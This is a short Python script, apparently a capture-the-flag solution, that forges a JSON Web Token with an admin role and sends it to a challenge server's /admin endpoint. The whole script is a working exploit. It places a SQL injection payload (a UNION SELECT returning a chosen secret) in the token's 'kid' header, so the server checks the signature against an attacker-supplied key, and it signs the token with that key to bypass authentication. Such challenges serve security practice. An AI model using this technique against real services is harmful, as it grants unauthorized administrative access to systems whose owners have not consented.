import jwt
import requests

secret = "techie_ernie_loves_kids"
payload = f'" AND 1=0 UNION SELECT "{secret}" -- '

token = jwt.encode(
    {"role": "admin"},
    secret,
    algorithm="HS256",
    headers={"kid": payload}
)

res = requests.get(f"http://chal1.lagncra.sh:8436/admin", cookies={"jwt": token})
print(res.text)
